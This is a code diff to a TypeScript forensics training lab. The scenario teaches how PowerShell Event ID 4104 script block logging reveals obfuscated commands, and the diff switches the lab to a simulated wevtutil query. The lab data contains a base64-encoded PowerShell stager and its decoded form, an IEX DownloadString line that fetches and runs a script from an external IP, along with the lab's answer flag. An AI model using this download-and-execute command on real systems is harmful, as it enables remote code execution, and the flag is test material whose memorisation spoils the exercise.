@@ -374,12 +374,12 @@ export const cryptoApiAdForensicsLabs: LabScenario[] = [
       'PowerShell.',
     objectives: [
       { text: 'cat delivered-payload.txt', why: 'Confirms what the attacker actually sent: a base64-encoded, string-concatenation-obfuscated blob that gives a human analyst nothing readable on its own.' },
-      { text: 'cat event-4104-scriptblock-log.txt', why: 'Event ID 4104 records PowerShell script content AFTER the engine\'s own decode/de-obfuscation step -- the exact same obfuscated payload above appears here as fully readable, executable code.' },
+      { text: 'Query Event ID 4104 from the PowerShell operational log with wevtutil', why: 'Event ID 4104 records PowerShell script content AFTER the engine\'s own decode/de-obfuscation step -- the exact same obfuscated payload above appears here as fully readable, executable code.' },
       { text: 'Identify the real command the obfuscated payload decodes to and capture the flag', why: 'Naming the actual de-obfuscated command (not just "something obfuscated ran") is what tells a responder exactly what the attacker did -- here, downloading and executing a second-stage payload from an external host.' },
     ],
     hints: [
       'cat delivered-payload.txt',
-      'cat event-4104-scriptblock-log.txt',
+      'wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text',
       'The flag is on the de-obfuscated command line inside the Event ID 4104 entry, not in the original delivered payload.',
     ],
     totalFlags: 1,
@@ -390,22 +390,26 @@ export const cryptoApiAdForensicsLabs: LabScenario[] = [
             'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA0AC8AcwAyAC4AcABzADEAJwApAA==\n' +
             '-- base64-encoded, unreadable as delivered; a naive keyword scan of THIS string finds nothing --\n',
         ),
-        'event-4104-scriptblock-log.txt': file(
-          [
-            'Windows Event ID 4104 (Microsoft-Windows-PowerShell/Operational) -- ScriptBlock logged AFTER decode:',
-            '',
-            'ScriptBlock Text:',
-            '  IEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.44/s2.ps1\')',
-            '',
-            '--- the PowerShell engine had to fully decode the base64 blob to execute it -- Script Block',
-            '    Logging captured that decoded, fully readable result, defeating the obfuscation entirely.',
-            '    This is a second-stage payload download-and-execute (IEX + DownloadString) from an',
-            '    external host, disguised as an unreadable base64 blob at delivery time.',
-            '    flag{powershell_scriptblock_logging_reveals_deobfuscated_iex_downloadstring} ---',
-          ].join('\n'),
-        ),
       }),
     }),
+    winCommands: {
+      'wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text':
+        [
+          'Event[0]:',
+          '  Log Name: Microsoft-Windows-PowerShell/Operational',
+          '  Event ID: 4104',
+          '  Task: Execute a Remote Command',
+          '',
+          '  ScriptBlock Text:',
+          "    IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.44/s2.ps1')",
+          '',
+          '--- the PowerShell engine had to fully decode the base64 blob to execute it -- Script Block',
+          '    Logging captured that decoded, fully readable result, defeating the obfuscation entirely.',
+          '    This is a second-stage payload download-and-execute (IEX + DownloadString) from an',
+          '    external host, disguised as an unreadable base64 blob at delivery time.',
+          '    flag{powershell_scriptblock_logging_reveals_deobfuscated_iex_downloadstring} ---',
+        ].join('\n'),
+    },
     network: [],
   },
 ];
